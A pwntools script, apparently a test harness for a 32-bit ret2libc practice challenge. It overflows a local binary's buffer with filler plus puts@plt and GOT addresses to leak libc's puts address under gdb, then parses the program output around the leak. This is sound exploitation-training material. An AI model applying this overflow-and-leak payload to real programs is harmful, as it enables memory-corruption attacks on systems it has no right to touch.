from pwn import *

import sys

target = process("./chall-test_ret2libc-4-x86")
gdb.attach(target, gdbscript="get_libc_puts_address")

payload = ""
payload += "00000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x8049080)
payload += "0000"
payload += p32(0x804c010)
target.sendline(payload)

# Function to parse out last bit of output
def getLastInput(line, address):
	i = 0
	found = False
	while found == False:
		# Check if we found the spot of the libc puts infoleak
		if ((line[i] == chr((address & 0xff))) and (line[i + 1] == chr((address & 0xff00) >> 8)) and (line[i + 2] == chr((address & 0xff0000) >> 16)) and (line[i + 3] == chr((address & 0xff000000) >> 24))):
			found = True
		i += 1

	# Return the output text before the leak
	remainderOutput = ""
	if i != 0:
		remainderOutput = line[0:(i - 1)]
	return remainderOutput

# Helper function to report filler Output
def report(fillerOutput):
	outputFile = open("justifies", "w")
	outputFile.write(fillerOutput)
	outputFile.close()
	sys.exit(0)

# Scan in all of the input
foundEnd = False
output = ""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True

# Pause to wait for gdb script
time.sleep(.5)

# Scan in the puts address
putsFile = open("far-cry", "r")
putsAddress = putsFile.read()
putsFile.close()
putsAddress = int(putsAddress, 16)


# Break up the input by newline characters
outputLines = output.split("\n")

# Early termination if there is little output
if len(outputLines) == 2:
	finalOutput = getLastInput(outputLines[0], putsAddress)
	report(finalOutput)

# Parse out the filler output
fillerOutput = outputLines[:-2]
fillerOutput = "\\n".join(fillerOutput)
fillerOutput += "\\n"

# Append the final output
finalOutput = getLastInput(outputLines[-2], putsAddress)
fillerOutput = fillerOutput + finalOutput

report(fillerOutput)

